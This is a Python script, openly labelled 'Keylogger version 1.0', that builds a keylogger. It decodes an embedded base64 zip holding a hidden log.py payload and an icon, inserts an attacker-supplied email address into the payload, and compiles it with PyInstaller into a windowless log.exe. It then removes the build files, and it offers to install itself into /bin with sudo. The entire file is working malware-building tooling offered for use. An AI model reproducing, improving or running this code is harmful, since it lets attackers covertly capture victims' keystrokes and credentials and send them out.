import zipfile
import os
import sys
import shutil
import time
import subprocess
import base64

x = 0

try:
	if len(sys.argv[1]) >= 2:
		x += 1
except:
	pass

if x == 1 and sys.argv[1] in ['-V', '--version']:
	print('Keylogger version 1.0')
	exit()
elif x == 1 and not(sys.argv[1] in ['-V', '--version']):
	email = sys.argv[1]
elif x == 1 and sys.argv[1] in ['-G', '--global'] and sys.platform in ['linux', 'linux2']:
	code = '#!/usr/bin/python3\n' + open('keylogger.py').read()
	open('keylogger', 'w').write(code)
	os.system('chmod +x keylogger;dos2unix keylogger;sudo mv keylogger /bin')
	print('\033[1;92m[ALERT] KEYLOGGER GLOBED !')
	exit()

if sys.platform in ['win32', 'win64']:
	try:
		import colorama
	except:
		print('\033[1;38;5;127mInstalling ...')
		subprocess.run('pip install colorama', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
		import colorama
	colorama.init()
	os.system('cls')
else:
	os.system('clear')

print('''
\033[1;38;5;57m█─▄▀  █▀▀▀  █── █  \033[1;38;5;129m█───  █▀▀▀█  █▀▀█  █▀▀█  █▀▀▀  █▀▀█ 
\033[1;38;5;57m█▀▄─  █▀▀▀  █▄▄▄█  \033[1;38;5;129m█───  █── █  █─▄▄  █─▄▄  █▀▀▀  █▄▄▀ 
\033[1;38;5;57m█─ █  █▄▄▄ ── █──  \033[1;38;5;129m█▄▄█  █▄▄▄█  █▄▄█  █▄▄█  █▄▄▄  █─ █''')

if x == 0:
	email = input('\033[1;38;5;202mEmail: \033[0;0m')

print('\r\033[1;38;5;48mbuilding[   ]', end='')

base64_data = 'UEsDBBQAAAAIAJlIT1cR+M6qLwwAAD5CAAAIAAAAaWNvbi5pY2/NnAlYFGUYgOm+j6f7qey05FAj0TJNo0xFlCMyVCwrAck7zPIxEBBhAblJQeTY5b4Pl1vAAFEOOZcblVEStDzAVETMvr5/3ZmH2V1mZFtwf5/3+Wbm/+f7v3d3ZsSZQS2te/CPoSGJb2hpf6al9YKWlpY2gpu0XBCyXdqwj68BwD3Ozs73Jicn3xcaGvoAxgeFQuHDuPzonj17Ho+JiXkS158OCwt7Ji4u7rno6OgXcP2l+Pj4l7Hv1aioqNdiY2Nfx+1vYv9bCQkJb2N8B7e/S4PjJmHUwahLkC2TbcwYsg/mmEhykFwkJ8lN5iBzYV0vkblJDbj8DKmJ1IbLj5NafX19HyG1Ewf0uZ84ETdlzqSfuEVERDxP5iDz4xxTMf+HuPwJshBzm+JcX2H8GlmN9fyAcSOyBcdtw+iA0RlxxT53HOuJcTeu+yIBuByAYwIJuByE7MXlEOzbhzGYbBvWH0D2wWU/kgOjFyLAZVcyB5kL85M5t5AaZLWsltVmietmOM4Ilw2RmbiuTz5f2ffyQnh4+BPkc6HdyWeK2+djzjXIDhznj+sRuD0Rl8XIQVwvw/VKXK7F2Ii0Ih3ICdzWhfE0xj+QM0gvrp9FzuHynxj/Qs4PB7dfwHhxGKx+so9s33MkF8kpy03mOI3bKDK3rAZSiwSpwz5SI6m1EMlCknE9EiP5bF2QdehoTI4pcnwEBgY+hP1TcH0D9u3H5WyMR3Gd5DuOdJP5ZTVdwv7LGK9gvIpxAON1jIPIDRlDuG0I481h/KMiTA5ZTgI9z6Bs7gHkmqwmUtslhHy+pGZSO/l+mjCSzyUPoxDdtmKcQc4Tcl7g8f0srk/D/iXY9x1iH+VvVyAULDojclv4l8h90UWkT+hufFkkMP5b6L74qkiw+JpQsHhAJFhCuI4MigQmg0LBkhtCjyU3cHmIwcNkSOhhcnM0kH3kctB5pfOQOb0Dll33CViG82MtWJNQYHwFuUxqJTUL3ReeF7ktOCfyNG+LCnEi3z85b83w+/8Az+8XybFPX/PI+UA+j7hQn+ciHacWCR10QJPxFMyADzJXw4cZ34O3mwHveKGD9pDQ6UNb/G4fI8c9+d6VXQuF2yf9NHw/711mIHBfrlG4Cyzg8yQrmHHAWopRAtm+VOlYP9dFjEvkr9rXwrZPflGZN91wTM1wf7PwUpgT26NRzEwJYdxpZqZEKB27MiRZ/jiw5fGnNNl/VkKxgruUTGuYnVCuMF7eH/2cR+Nf3y6BzktDGkHV2QswW7xJuT9imL0V6v+8zNqnojp/lP46LP8Lva14edSMZl8ZOKI7jXNtOGuf0y1Fo/IXOehQIkddoLnY2zZCNePb0qgSXnea4p4aZr/TrUWMiwxO/yhHXSpqhx7QKPOvK8sfVwrLM2Fu9jpeb5p5uZvg/PU+xn+4D59/9A49KtppMtAo8y9I2Ddu5CaEgHnmZjAQ246KjZUB8O+//0J3azHjIoPTP8ZpMhXjPAVolPkP3RgcN/a2pMO0bDuVSDlVAt1txYwLgc8/1mkKFecyFWgunr1757+krwum562H93PXqsSsgs1QXpPAuBBiXaZy+uMYKn7ne0Bz6Ww7X5lj0q7dHATTMhfQR///g8mBNRC7U5/xiefxj9+pTyW46gONMv8zXe1jjlO9CN4r2KgW1keYMj7xrvqc/omu71OJu94HGmX+fNes/4t/mjdMLdysNvQPbgI/v7m3nXj8k3ZNo5LcpgGNMv8e/H7GCkl7DXxUuBWmFNmrFUO8HsYKpkOi2zRO/2Q3AyrZ3QBo+sb5/F/fGA6TD20ZE76LXw7JPP4p7gZUivt0oOk7N37+ST0VoPf71jHFJtbSldNfMJ1K9ZgBNH3nOvjKVks7NXAeph92BN3SX8aWkp/P6B61f2Yk/zTBDCrN4wOgUebPd/0aLeRnPKMiJ9Ap2zYuaJdtSxrR3/MDKt3zQ6BR5l+PP5Ork1+KAkH78PZx5d3y7V8r80/3mklles0Emv4xPv4b/u4GvaM7YNIRh3Hm1763qx0myPsf2P0RhQDNWF7/bty6CQvq/WFSheNd4Z0Kx2IFf+9ZlNh7FtCcasjg01C59d8cgDl1PvBupdPdoWLHSXl/sc9sKstnNtAU7DWGvt4WPpUxa9NqPeCdKmeVscb748N9xD6zOP/+xzFUtu/HwGYOlEZ9A0eTNo47UyudYeKxnSpjjfdFWS4+H3P6oyuV4zcHNIUpeJxOrHFVGesDNqx82X7c/jiGyvWfC5rCZDyG367dpTLWeC+IldNvLqd/bsBcKi/gE9AU9Kpd4K06N5WxzlrDyod+nP75gYYUApqCHp7Db9YLVMYa/93HyhlgyOlfEPgpVRD0KWgKujW74M0GD5WxzlnLypcfxO1/MOgzqvC3z0BT0Kl1gzcaPVXGOncdKx/6cfoX/jaPKtozDzQFnTp3eEPipTI2eA+QnZPbv2jP51Tx3s9BU9CpE8DrTbtVxiZvAysf+nH6F++dTx0Kng+agna9B7zW7K0yNvkb5XJy++MY6veQBaApaDd4wmstPipjU7CJle9Q8AJO/5LgBVTJvoWgKWg3esGEFl+VsTm4WS4nt39pqBGFgKYwCa9hE1r9VMYG738Pz1eyz4jTvyx0EVW2fxEM5wg+P6iOW3FXmNTkDRPa/FXGtuhHlkvZfm7/w/uNqfKwxUBTn2INXUc8QJL7M9Rn2Y87k/AYfhU9VMW22J5xkbLfmNMfx1BHwhcDoVJkAcdLd0KK12yO98rGlol4/r/aHqAytsVbpC405eHc/kfDl1AVESZAqEv+Fgr2m/PWOJZMlOyGV9oDVWbNoZ+kLjTox+lfGWFCIUBoSPkeUnd/zFvjWPK2xBte6QhSmTX4zIP2kcLjXxVhSlVFmgGhMXU1HvuK/tEu70OK97xxQbvFj9dxJCZ0BoEd+tM+UiJMHbj8qyNNqWqRORAkadYK/uXpjjA0eJXvtp3a2ienRaB9MhheQZfRMqc7AuxKfpa60FRFmX/L6S8yp47hOIIkzQZSh/lnBJniOzW3+EpWa5vRJQSnK2KwuZA8Kjb1pYHFuVj4Ca//tA+hLsZUl8v/WNQXVE2UBRCa0m1Z/hVZbgr1Xe0/C1cunVHKrX9uKjEaXYvrbwa9k6GwsCdqVMz5IwIM8Gen/MQVUpfbfHGCy520mmgLqjbaAgjNGWtY17/KbIFCfeQcHenaRT4DdbXjtems3BWJq6U1jhJHPv/amC+pupileJwshZZMO431r0R/us47Ab36WqPMn+Xzr4tdSjXEfgWE1gM/QJr3XObdyaocD4W6Un3my79fyaBe/wxW7qokG2mNd86XP/C5k4ZjqYY4SyC0iddCpq8hxOJ7c4RjeV4KdWX4L2T65VGn/8n6TFbu6hRbaY13ROxXkXzedGuMs6Qk8cuA0C5eB1kB85h3p2rzdyvUJQ40ZvrludrXo8REtdbVcICVuybVTlojH+hTUBNqIP1drztpknhLqilhGRA6stZDbtB8fGcG3wVC6g/6KNSV89sSpl8edfpTjWJW7rr0tdIauZAkLKtvyzR9gs95eGtKXE41498ZhM7s9ZC/14h5F6Sx0FehrrxgM6ZfHnX6n5JksXI3ZKyT1jgyy7vb4pe/zOcr35qTVlAt+Ls1hOM5G6AwxBgy8T0AgqTYX6Gug/u+YPrludbfq8REtXa6KZuVuzFzg7RGZaB/f2ui5WQ+V2UN96dak1cC4UQu3jsMNYEsfG5KaD4UqFBXcdhSpl8edfp3N+ewcjeJN0prVMTqRlui1ad8niO1tuSVpW0pXwPhJL5HXxJmxjw7bC0JUqjr9wjLEZ9dDlxWn/+ZllxW7uaszdIah4P+t9qSV6zkc+RqbalWVu2pXwOhK28zHI60YJ4dtZfuUairTLRixGdXA5fPKjFRrfW05rFyt+bYS2tkSFl5oT3FyozP705aR9o3XsitE2I7KI8wY54ddB4O5itzzFpvWwHrOUYT/tu0I20Vun/T15GyyrddvOI5Pq/RtJMZVlM601ZtI/fLyD1zQmd5sDOWclfobc9n6iDUx325rTN91YLOXKOH+Fy4Wv/t8BT5fwKwKf39eNLoftn4h+5yvE8u0nXRPvKRL5+mxadGiK/L4idy0VkW4Xa8Rxbvk8WHZPEpGLydBv65vRv8B1BLAwQUAAAACACkSU9XJzX9udkCAABzBgAABgAAAGxvZy5weW1VbWvbMBD+3ED+g+kXObTVOthoN9ox2AuMrTBovnXDKPbFUSNLmnTOy379TpLtxOnyJbrTc4/u5Tm8dKbJ7F7bFvka9gsjXJXJxhqH2Q/pETS46SSioBFS8UY2wJtWobSCMB304dvDl4fe+RKPsBtB52R3KFw5EJXUdX8/j47+lqL7C68A7HTSWw1aJRfTyXRSwTLzoKt89n46OXNQSitBYxETyO4zxsgdAOAOPipWmboGx2+44G/4jl9/rGPGpWlCwHYlFWRz10JgPYuv5++ur2fBQreP3rOQRuHBbcAF1mDyEU0HiTnfZ29vb6KvAe9FDeQZdS5nQiE4LVBugMWXeugT+0oNYb8p5LiUMWRuIuCkBWPMY7t4hhIjkH2H1ISU6QobVcSxprzCmHJ2Zz+wC2NB54zAHHfIZjzMKJ9dsLtXdHuZsRAa/ltcXt12mQ90XFRVsaIIcDn7ZDSpCq8+S2+NlyiNDoFSK6lPauYCUZSrfCBKt0O7Ow3wx4f5z/xoEpfxJvb8OIJ7JA5UPh95qSip8+OmUjq68X/3Chb72ku7tU2XWE9E4AA8iTrp+2U21OELj45Ens9GPH9aiSkZ2JVgMWnKCu+DrtMm5JR0DXgfnpqlEkJIkj3lXpCSidysIadTWIGMfnQMDUIXnTQuq0QJ+Tk7v8zOz2N8gMllQkYp7Lm3BGIdxYGGZaSPYII6CaBaSTwvA37p0wips6f0xkousXBh5sEkwRdROcEo0algHYwBVwrrC2XKde9AseiPkfKYsB7CFtTCch2qSqQLslKVya5AAfaGpRFh4UsHQJqMrgYqKYqNUW0DRdMO0JG/tf/zVmY7ZtG0TiMHzWRPum79mNU62EjT+r4PTdWdlq+7A/hyiNBtd1QQmpCqOjw95OZkvaKtfzkrmlTyjXecGiho0bdOYlJWgG0lrobvQm50yNX7+5EMZ5nwmeowQdH9mT8bWrTZP1BLAQI/AxQAAAAIAJlIT1cR+M6qLwwAAD5CAAAIACQAAAAAAAAAIICwgQAAAABpY29uLmljbwoAIAAAAAAAAQAYAAD9TkU+/9kBwVqo0IL/2QHBWqjQgv/ZAVBLAQI/AxQAAAAIAKRJT1cnNf252QIAAHMGAAAGACQAAAAAAAAAIICwgVUMAABsb2cucHkKACAAAAAAAAEAGACAK4ttP//ZAeHFQc+C/9kB4cVBz4L/2QFQSwUGAAAAAAIAAgCyAAAAUg8AAAAA'

zip_data = base64.b64decode(base64_data)

with open('files.zip', 'wb') as output_file:
    output_file.write(zip_data)

with zipfile.ZipFile('files.zip', 'r') as zip_ref:
    zip_ref.extractall('')

print('\r\033[1;38;5;48mbuilding[.  ]', end='')

code_1 = open('log.py').read()
open('log.py', 'w').write(code_1[0:221] + email + code_1[221:])

print('\r\033[1;38;5;48mbuilding[.. ]', end='')

if os.path.exists('log.exe'):
	os.remove('log.exe')

subprocess.run('pyinstaller --windowed --onefile --icon=icon.ico log.py', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
os.remove('log.py')
os.remove('icon.ico')
os.remove('log.spec')
os.remove('files.spec')
shutil.move('dist/log.exe', os.getcwd())
shutil.rmtree('dist')
shutil.rmtree('build')

print('\r\033[1;38;5;48mbuilding[...]', end='')

print('\n\033[1;38;5;196m[ALERT] done keylogger saved in log.exe\033[0;0m')

time.sleep(3)